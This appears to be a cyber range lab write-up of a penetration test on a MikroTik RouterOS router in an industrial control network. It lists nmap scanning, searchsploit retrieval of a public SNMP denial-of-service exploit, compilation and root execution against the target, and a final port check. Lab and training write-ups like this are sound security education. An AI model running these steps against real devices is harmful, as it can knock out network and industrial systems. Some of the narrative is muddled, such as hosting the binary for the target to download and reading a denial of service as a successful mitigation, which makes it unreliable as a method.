# MikroTik RouterOS ICS Security Penetration Test

This repository details the steps and commands used in a cyber range exercise focusing on the penetration testing of a MikroTik RouterOS device in an Industrial Control Systems (ICS) environment. The primary goal was to perform reconnaissance, exploit a vulnerability, and verify remediation (OpSec Verification).

#Role	#IP #Address	#Notes
#Attacker Machine	10.13.20.91	
#Source IP for launching the exploit.
#Target Router (MikroTik)	10.13.20.16	
#Identified as running MikroTik RouterOS 7.x.


#Phase 1: Reconnaissance and Network Mapping
Initial steps to understand the attacker's network configuration and to map the surrounding hosts in the subnet (10.13.20.0/24).

#1.1 Check Attacker Network Configuration
Verify the attacker's own IP address, which is used as the source for the attack.

#Command	Purpose
ifconfig	
Display network interfaces and IP addresses.
ip addr show	
Display IP address and interface details.

#1.2 Host Discovery Scan
Use Nmap to perform a ping scan of the entire subnet to find active hosts.

#Bash
nmap -sn 10.13.20.0/24

#Phase 2: Target Enumeration and Vulnerability Identification
Once the target IP (10.13.20.16) was identified, a detailed scan was performed to determine the operating system, running services, and device type.

#2.1 Aggressive Port and OS/Service Scan
Run a comprehensive Nmap scan focusing on common ports and enabling aggressive options for service and OS detection. The scan identified the target as running MikroTik RouterOS 7.x.

Bash
nmap -p 22,5000,8080,502,1502,2502 -A -sV -O -Pn -T4 10.13.20.16

#2.2 Search for Exploits
Use searchsploit (part of the Exploit Database toolkit) to find publicly known vulnerabilities for the identified operating system, MikroTik RouterOS 7.

#Bash
searchsploit mikrotik routeros 7
The search revealed several exploits, including the SNMP SET Denial of Service vulnerability.

#2.3 Download Exploit Source Code
Download the specific exploit file (31102.c) to the local machine.

#Bash
searchsploit -m exploits/hardware/dos/31102.c
Phase 3: Exploit Preparation and Delivery
The C source code for the exploit was prepared, compiled, and transferred to the target system via a temporary HTTP server.

#3.1 Review and Compile the Exploit
Review the source code and compile the C file (31102.c) into an executable binary called exploit_binary1.

#Command	Purpose
nano 31102.c	
Open the C source file in the nano text editor.
gcc 31102.c -o exploit_binary1	
Compile the source code using gcc into an executable file.

#3.2 Host and Transfer the Exploit
Start a temporary Python web server to host the compiled exploit binary for the target to download. A log entry shows the target (10.13.20.16) successfully downloading the file.

#Bash
python3 -m http.server 8080

#Phase 4: Exploitation and Post-Exploitation
Execute the compiled exploit binary targeting the SNMP service on the victim machine.

#4.1 Execute Exploit Binary
Attempt to run the exploit, specifying the source (-s) and destination (-d) IP addresses and the default SNMP community string (-c public). The initial attempt failed due to a lack of root privileges.

#Command	Notes
./exploit_binary1 -s 10.13.20.91 -d 10.13.20.16 -c public	
Initial attempt (failed).
sudo ./exploit_binary1 -s 10.13.20.91 -d 10.13.20.16 -c public	
Run as root (successful packet sending, confirms SNMPd must be down).

#4.2 Secure File Copy (Example OpSec Step)
Securely transfer another file (app.py) to a separate remote host, indicating post-exploitation activity or further simulation setup.

#Bash
scp app.py student@10.14.7.18:docker/substation-envsim/
Phase 5: Operational Security (OpSec) Verification
The final step is crucial in a controlled environment: confirming that the exploit vector (SNMP on port 161/udp) has been successfully disabled or mitigated.

#5.1 Verify SNMP Service State
Scan the target's UDP port 161 (the standard SNMP port) using sudo nmap -sU to confirm it is no longer listening.

#Bash
sudo nmap -sU -p 161 10.13.20.16

#Verification Result: The scan showed 161/udp closed snmp , proving the mitigation action was successful and the primary exploit vector was disabled.
